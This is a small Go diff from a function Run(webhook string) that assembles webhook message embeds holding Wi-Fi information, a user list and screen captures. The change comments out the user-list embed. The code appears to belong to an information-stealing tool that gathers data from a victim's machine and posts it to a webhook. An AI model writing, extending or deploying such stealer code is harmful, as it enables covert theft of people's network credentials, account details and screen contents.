@@ -250,10 +250,10 @@ func Run(webhook string) {
 						"value": fmt.Sprintf("```%s```", GetWifi()),
 					},
 				},
-			}, {
+			}, /*{
 				"title":       "All Users",
 				"description": fmt.Sprintf("```%s```", users),
-			},
+			}, */
 		},
 	}, GetScreens()...)
 
